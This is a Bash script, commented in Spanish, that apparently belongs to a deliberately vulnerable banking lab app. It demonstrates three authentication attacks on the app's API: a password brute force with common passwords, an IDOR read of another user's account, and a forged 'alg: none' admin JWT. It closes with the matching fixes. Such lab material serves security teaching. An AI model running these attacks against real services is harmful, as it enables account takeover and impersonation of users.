#!/usr/bin/env bash
#
# M3 — Insecure Authentication / Authorization
#   (a) fuerza bruta de login sin límite de intentos
#   (b) IDOR: acceder a la cuenta de otro usuario
#   (c) falsificación de JWT (signature not verified)
#
# Rama: vuln/M3
# Uso:  ./scripts/M3-bruteforce-idor.sh
#
set -euo pipefail
source "$(dirname "$0")/_common.sh"

bold "M3 · Insecure Authentication/Authorization"
info "API: $API_BASE"

bold "1) Fuerza bruta de contraseña (¿hay rate limiting?) — usuario luis@vulnbank.com"
for p in 123456 password qwerty admin letmein 111111 000000; do
  code=$(curl -s -o /dev/null -w '%{http_code}' --cacert "$CA" -X POST "$API_BASE/login" \
    -H 'Content-Type: application/json' \
    -d "{\"email\":\"luis@vulnbank.com\",\"password\":\"$p\"}")
  printf "  intento '%-9s' → HTTP %s\n" "$p" "$code"
done
info "vuln/M3: siempre 401 (sin bloqueo). fix/M3: 429 a partir del 6.º intento."

bold "2) IDOR: leer la cuenta 2001 (de OTRO usuario) con token de Ana"
TOKEN="$(login_token ana@vulnbank.com password123)"
code=$(curl -s -o /tmp/m3_account.json -w '%{http_code}' --cacert "$CA" \
  "$API_BASE/accounts/2001" -H "Authorization: Bearer $TOKEN")
printf "  GET /accounts/2001 → HTTP %s\n" "$code"
cat /tmp/m3_account.json; echo

bold "3) Falsificación de JWT (forjar sesión de admin sin la clave)"
FORGED=$(python3 - <<'PY'
import base64, json
def b64(b): return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
header={"alg":"none","typ":"JWT"}
payload={"sub":3,"email":"admin@vulnbank.com","role":"admin","iat":0,"exp":9999999999}
print(f'{b64(json.dumps(header).encode())}.{b64(json.dumps(payload).encode())}.')
PY
)
code=$(curl -s -o /tmp/m3_forged.json -w '%{http_code}' --cacert "$CA" \
  "$API_BASE/profile" -H "Authorization: Bearer $FORGED")
printf "  GET /profile con JWT forjado → HTTP %s\n" "$code"
cat /tmp/m3_forged.json; echo

echo
bold "Impacto: acceso a cuentas ajenas y suplantación sin credenciales válidas."
bold "Fix (fix/M3): rate limiting, authz por owner en el servidor, verificar firma del JWT."
